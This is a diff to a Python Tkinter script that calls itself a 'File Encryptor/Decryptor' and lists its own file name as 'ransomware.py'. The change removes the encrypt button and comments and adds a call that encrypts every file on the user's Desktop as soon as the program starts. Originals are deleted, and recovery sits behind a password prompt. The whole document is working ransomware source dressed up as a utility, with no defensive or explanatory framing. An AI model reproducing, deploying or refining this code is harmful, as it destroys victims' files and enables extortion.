@@ -35,24 +35,27 @@ def encrypt_directory(directory, key):
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Skip excluded files
                 if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
+
                 filepath = os.path.join(root, file)
                 with open(filepath, "rb") as file_obj:
                     file_data = file_obj.read()
+                
                 encrypted_data = f.encrypt(file_data)
                 encrypted_filepath = filepath + ".enc"
+                
                 with open(encrypted_filepath, "wb") as file_obj:
                     file_obj.write(encrypted_data)
-                os.remove(filepath)  # Delete the original file
+                
+                os.remove(filepath)
+
         messagebox.showinfo("Success", "All files encrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Encryption failed: {e}")
 
 def decrypt_directory(directory, key):
     try:
-        # Ask for password before decryption
         entered_password = simpledialog.askstring(
             "Password Required", "Enter the decryption password:", show="*"
         )
@@ -64,7 +67,6 @@ def decrypt_directory(directory, key):
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Process only files with the .enc extension
                 if not file.endswith(".enc"):
                     continue
                 filepath = os.path.join(root, file)
@@ -72,10 +74,10 @@ def decrypt_directory(directory, key):
                     with open(filepath, "rb") as file_obj:
                         encrypted_data = file_obj.read()
                     decrypted_data = f.decrypt(encrypted_data)
-                    decrypted_filepath = filepath[:-4]  # Remove the .enc extension
+                    decrypted_filepath = filepath[:-4]
                     with open(decrypted_filepath, "wb") as file_obj:
                         file_obj.write(decrypted_data)
-                    os.remove(filepath)  # Delete the encrypted file
+                    os.remove(filepath)
                 except Exception as e:
                     messagebox.showerror(
                         "Error", f"Failed to decrypt {filepath}. Error: {e}"
@@ -85,23 +87,20 @@ def decrypt_directory(directory, key):
         messagebox.showerror("Error", f"Decryption failed: {e}")
 
 def encrypt_desktop():
-    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")  # Desktop path
+    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
     encrypt_directory(desktop_path, key)
 
 def decrypt_desktop():
-    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")  # Desktop path
+    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
     decrypt_directory(desktop_path, key)
 
 root = Tk()
 root.title("File Encryptor/Decryptor")
 
-# Set window size explicitly to ensure visibility
-root.geometry("300x150")  # Adjust the width and height as needed
-
-encrypt_button = Button(root, text="Encrypt All in Desktop", command=encrypt_desktop)
-encrypt_button.pack(pady=10)
+root.geometry("300x150")
 
 decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
 decrypt_button.pack(pady=10)
 
+encrypt_desktop()
 root.mainloop()
